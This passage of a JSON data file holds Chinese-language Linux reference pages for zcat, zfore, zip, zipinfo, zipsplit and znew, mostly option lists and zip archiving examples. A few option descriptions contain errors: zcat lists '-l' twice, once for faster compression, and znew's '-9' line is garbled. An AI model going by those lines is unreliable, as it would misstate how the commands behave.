        "body": "<h1 id=\"zcat\">zcat</h1>\n<p>显示压缩包中文件的内容</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>zcat命令</strong> 用于不真正解压缩文件，就能显示压缩包中文件的内容的场合。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">zcat</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-S：指定gzip格式的压缩包的后缀。当后缀不是标准压缩包后缀时使用此选项；</span>\n<span class=\"hljs-deletion\">-c：将文件内容写到标注输出；</span>\n<span class=\"hljs-deletion\">-d：执行解压缩操作；</span>\n<span class=\"hljs-deletion\">-l：显示压缩包中文件的列表；</span>\n<span class=\"hljs-deletion\">-L：显示软件许可信息；</span>\n<span class=\"hljs-deletion\">-q：禁用警告信息；</span>\n<span class=\"hljs-deletion\">-r：在目录上执行递归操作；</span>\n<span class=\"hljs-deletion\">-t：测试压缩文件的完整性；</span>\n<span class=\"hljs-deletion\">-V：显示指令的版本信息；</span>\n<span class=\"hljs-deletion\">-l：更快的压缩速度；</span>\n<span class=\"hljs-deletion\">-9：更高的压缩比。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要显示其中文件内容的压缩包。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "zfore",
        "des": "强制为gzip格式的压缩文件添加.gz后缀",
        "body": "<h1 id=\"zfore\">zfore</h1>\n<p>强制为gzip格式的压缩文件添加.gz后缀</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>zfore命令</strong> 强制为gzip格式的压缩文件添加“.gz”后缀。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">zfore</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件列表：指定要添加“.gz”后缀的gzip压缩文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "zip",
        "des": "可以用来解压缩文件",
        "body": "<h1 id=\"zip\">zip</h1>\n<p>可以用来解压缩文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>zip命令</strong> 可以用来解压缩文件，或者对文件进行打包操作。zip是个使用广泛的压缩程序，文件经它压缩后会另外产生具有“.zip”扩展名的压缩文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">zip</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-A：调整可执行的自动解压缩文件；</span>\n<span class=\"hljs-deletion\">-b&lt;工作目录&gt;：指定暂时存放文件的目录；</span>\n<span class=\"hljs-deletion\">-c：替每个被压缩的文件加上注释；</span>\n<span class=\"hljs-deletion\">-d：从压缩文件内删除指定的文件；</span>\n<span class=\"hljs-deletion\">-D：压缩文件内不建立目录名称；</span>\n<span class=\"hljs-deletion\">-f：此参数的效果和指定“-u”参数类似，但不仅更新既有文件，如果某些文件原本不存在于压缩文件内，使用本参数会一并将其加入压缩文件中；</span>\n<span class=\"hljs-deletion\">-F：尝试修复已损坏的压缩文件；</span>\n<span class=\"hljs-deletion\">-g：将文件压缩后附加在已有的压缩文件之后，而非另行建立新的压缩文件；</span>\n<span class=\"hljs-deletion\">-h：在线帮助；</span>\n<span class=\"hljs-deletion\">-i&lt;范本样式&gt;：只压缩符合条件的文件；</span>\n<span class=\"hljs-deletion\">-j：只保存文件名称及其内容，而不存放任何目录名称；</span>\n<span class=\"hljs-deletion\">-J：删除压缩文件前面不必要的数据；</span>\n<span class=\"hljs-deletion\">-k：使用MS-DOS兼容格式的文件名称；</span>\n<span class=\"hljs-deletion\">-l：压缩文件时，把LF字符置换成LF+CR字符；</span>\n<span class=\"hljs-deletion\">-ll：压缩文件时，把LF+cp字符置换成LF字符；</span>\n<span class=\"hljs-deletion\">-L：显示版权信息；</span>\n<span class=\"hljs-deletion\">-m：将文件压缩并加入压缩文件后，删除原始文件，即把文件移到压缩文件中；</span>\n<span class=\"hljs-deletion\">-n&lt;字尾字符串&gt;：不压缩具有特定字尾字符串的文件；</span>\n<span class=\"hljs-deletion\">-o：以压缩文件内拥有最新更改时间的文件为准，将压缩文件的更改时间设成和该文件相同；</span>\n<span class=\"hljs-deletion\">-q：不显示指令执行过程；</span>\n<span class=\"hljs-deletion\">-r：递归处理，将指定目录下的所有文件和子目录一并处理；</span>\n<span class=\"hljs-deletion\">-S：包含系统和隐藏文件；</span>\n<span class=\"hljs-deletion\">-t&lt;日期时间&gt;：把压缩文件的日期设成指定的日期；</span>\n<span class=\"hljs-deletion\">-T：检查备份文件内的每个文件是否正确无误；</span>\n<span class=\"hljs-deletion\">-u：更换较新的文件到压缩文件内；</span>\n<span class=\"hljs-deletion\">-v：显示指令执行过程或显示版本信息；</span>\n<span class=\"hljs-deletion\">-V：保存VMS操作系统的文件属性；</span>\n<span class=\"hljs-deletion\">-w：在文件名称里假如版本编号，本参数仅在VMS操作系统下有效；</span>\n<span class=\"hljs-deletion\">-x&lt;范本样式&gt;：压缩时排除符合条件的文件；</span>\n<span class=\"hljs-deletion\">-X：不保存额外的文件属性；</span>\n<span class=\"hljs-deletion\">-y：直接保存符号连接，而非该链接所指向的文件，本参数仅在UNIX之类的系统下有效；</span>\n<span class=\"hljs-deletion\">-z：替压缩文件加上注释；</span>\n<span class=\"hljs-deletion\">-$：保存第一个被压缩文件所在磁盘的卷册名称；</span>\n<span class=\"hljs-deletion\">-&lt;压缩效率&gt;：压缩效率是一个介于1~9的数值。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  zip压缩包：指定要创建的zip压缩包；</li>\n<li>  文件列表：指定要压缩的文件列表。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>将<code>/home/Blinux/html/</code>这个目录下所有文件和文件夹打包为当前目录下的html.zip：</p>\n<pre><code class=\"language-shell\">zip -<span class=\"hljs-selector-tag\">q</span> -r <span class=\"hljs-selector-tag\">html</span><span class=\"hljs-selector-class\">.zip</span> /home/Blinux/<span class=\"hljs-selector-tag\">html</span>\n</code></pre>\n<p>上面的命令操作是将绝对地址的文件及文件夹进行压缩，以下给出压缩相对路径目录，比如目前在Bliux这个目录下，执行以下操作可以达到以上同样的效果：</p>\n<pre><code class=\"language-shell\">zip -<span class=\"hljs-selector-tag\">q</span> -r <span class=\"hljs-selector-tag\">html</span><span class=\"hljs-selector-class\">.zip</span> <span class=\"hljs-selector-tag\">html</span>\n</code></pre>\n<p>比如现在我的html目录下，我操作的zip压缩命令是：</p>\n<pre><code class=\"language-shell\">zip -<span class=\"hljs-selector-tag\">q</span> -r <span class=\"hljs-selector-tag\">html</span><span class=\"hljs-selector-class\">.zip</span> *\n</code></pre>\n<p>压缩 <code>example/basic/</code> 目录内容到 <code>basic.zip</code> 压缩包中 <code>-x</code> 指定排除目录，注意没有双引号将不起作用。</p>\n<pre><code class=\"language-shell\">zip -r basic.zip example/basic/ -<span class=\"hljs-keyword\">x</span> <span class=\"hljs-string\">\"example/basic/node_modules/*\"</span> -<span class=\"hljs-keyword\">x</span> <span class=\"hljs-string\">\"example/basic/build/*\"</span> -<span class=\"hljs-keyword\">x</span> <span class=\"hljs-string\">\"example/basic/coverage/*\"</span>\n</code></pre>\n<p>上面压缩解压出来，内容存放在 <code>example/basic/</code>， 如果想存放到根目录，进入目录进行压缩，目前没有找到一个合适的参数来解决此问题。</p>\n<pre><code>cd example/basic/ &amp;&amp; zip -r basic.zip . -<span class=\"hljs-keyword\">x</span> <span class=\"hljs-string\">\"node_modules/*\"</span> -<span class=\"hljs-keyword\">x</span> <span class=\"hljs-string\">\"build/*\"</span> -<span class=\"hljs-keyword\">x</span> <span class=\"hljs-string\">\"coverage/*\"</span>\n</code></pre>\n<p>压缩效率选择:</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">zip</span> -<span class=\"hljs-number\">9</span> # <span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">9</span> faster-&gt;better\n</code></pre>\n<p>创建 <code>public_html</code> 目录下忽略所有文件和文件夹，排除包括文本 <code>backup</code> 的所有文件。</p>\n<pre><code class=\"language-shell\">$ <span class=\"hljs-built_in\">zip</span> -r public_html.<span class=\"hljs-built_in\">zip</span> public_html -x *backup*\n</code></pre>\n<p><code>httpdocs</code> 目录忽略 <code>.svn</code> 文件或 <code>git</code> 的文件和目录下创建所有文件的归档。</p>\n<pre><code class=\"language-shell\">$ zip -r httpdocs.zip httpdocs <span class=\"hljs-params\">--exclude</span> *<span class=\"hljs-string\">.svn</span>* <span class=\"hljs-params\">--exclude</span> *<span class=\"hljs-string\">.git</span>*\n</code></pre>\n<p><code>httpdocs</code> 目录忽略的所有文件，并与 <code>.log</code> 结尾的目录下创建所有文件的归档。</p>\n<pre><code class=\"language-shell\">$ <span class=\"hljs-built_in\">zip</span> -r httpdocs.<span class=\"hljs-built_in\">zip</span> httpdocs --exclude <span class=\"hljs-string\">\"*.log\"</span>\n</code></pre>\n<h3 id=\"问题解决\">问题解决</h3>\n<p>CentOS7中命令找不到</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">Bash: Unzip: Command Not Found</span>\n</code></pre>\n<p>解决方法</p>\n<pre><code class=\"language-shell\">yum <span class=\"hljs-keyword\">install</span> -y unzip zip\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "zipinfo",
        "des": "用来列出压缩文件信息",
        "body": "<h1 id=\"zipinfo\">zipinfo</h1>\n<p>用来列出压缩文件信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>zipinfo命令</strong> 用来列出压缩文件信息。执行zipinfo指令可得知zip压缩文件的详细信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">zipinfo</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-1：只列出文件名称；</span>\n<span class=\"hljs-deletion\">-2：此参数的效果和指定“-1”参数类似，但可搭配“-h”，“-t”和“-z”参数使用；</span>\n<span class=\"hljs-deletion\">-h：只列出压缩文件的文件名称；</span>\n<span class=\"hljs-deletion\">-l：此参数的效果和指定“-m”参数类似，但会列出原始文件的大小而非每个文件的压缩率；</span>\n<span class=\"hljs-deletion\">-m：此参数的效果和指定“-s”参数类似，但多会列出每个文件的压缩率；</span>\n<span class=\"hljs-deletion\">-M：若信息内容超过一个画面，则采用类似more指令的方式列出信息；</span>\n<span class=\"hljs-deletion\">-s：用类似执行“ls-l”指令的效果列出压缩文件内容；</span>\n<span class=\"hljs-deletion\">-t：只列出压缩文件内所包含的文件数目，压缩前后的文件大小及压缩率；</span>\n<span class=\"hljs-deletion\">-T：将压缩文件内每个文件的日期时间用年，月，日，时，分，秒的顺序列出；</span>\n<span class=\"hljs-deletion\">-v：详细显示压缩文件内每一个文件的信息；</span>\n<span class=\"hljs-deletion\">-x&lt;范本样式&gt;：不列出符合条件的文件的信息；</span>\n<span class=\"hljs-deletion\">-z：如果压缩文件内含有注释，就将注释显示出来。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定zip格式的压缩包。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "zipsplit",
        "des": "将较大的zip压缩包分割成各个较小的压缩包",
        "body": "<h1 id=\"zipsplit\">zipsplit</h1>\n<p>将较大的zip压缩包分割成各个较小的压缩包</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>zipsplit命令</strong> 用于将较大的“zip”压缩包分割成各个较小的“zip”压缩包。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">zipsplit</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-n：指定分割后每个zip文件的大小；</span>\n<span class=\"hljs-deletion\">-t：报告将要产生的较小的zip文件的大小；</span>\n<span class=\"hljs-deletion\">-b：指定分割后的zip文件的存放位置。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要分割的zip压缩包。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "znew",
        "des": "将.Z压缩包重新转化为gzip命令压缩的.gz压缩包",
        "body": "<h1 id=\"znew\">znew</h1>\n<p>将.Z压缩包重新转化为gzip命令压缩的.gz压缩包</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>znew命令</strong> 用于将使用compress命令压缩的“.Z”压缩包重新转化为使用gzip命令压缩的“.gz”压缩包。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">znew</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>f：<span class=\"hljs-comment\"># 强制执行转换操作，即是目标“.gz”已经存在；</span>\n<span class=\"hljs-literal\">-</span>t：<span class=\"hljs-comment\"># 删除原文件前测试新文件；</span>\n<span class=\"hljs-literal\">-</span>v：<span class=\"hljs-comment\"># 显示文件名和每个文件的压缩比；</span>\n<span class=\"hljs-literal\">-</span>9：<span class=\"hljs-comment\"># 食用油花的压缩比，速度较慢；</span>\n<span class=\"hljs-literal\">-</span>P：<span class=\"hljs-comment\"># 使用管道完成转换操作，以降低磁盘空间使用；</span>\n<span class=\"hljs-literal\">-</span>K：<span class=\"hljs-comment\"># 当“.Z”文件比“.gz”文件小时，保留“.Z”文件。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定compress指令压缩生成的“.Z”压缩包。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    }
]
